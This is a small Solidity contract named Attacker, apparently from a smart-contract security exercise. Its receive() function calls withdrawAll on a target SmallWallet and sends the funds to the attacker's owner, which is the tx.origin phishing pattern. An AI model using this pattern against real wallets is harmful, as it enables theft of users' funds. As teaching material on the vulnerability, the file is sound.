// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.9;

import "@openzeppelin/contracts/access/Ownable.sol";
//import "hardhat/console.sol";

interface ISmallWallet {

    
     function withdrawAll(address _recipient) external payable ;
}

contract Attacker is Ownable {
    ISmallWallet public immutable smallWallet;

    constructor(address _smallWallet) {
        smallWallet = ISmallWallet(_smallWallet);
        
    }
    

   receive() external payable {
     smallWallet.withdrawAll(owner());
   }
}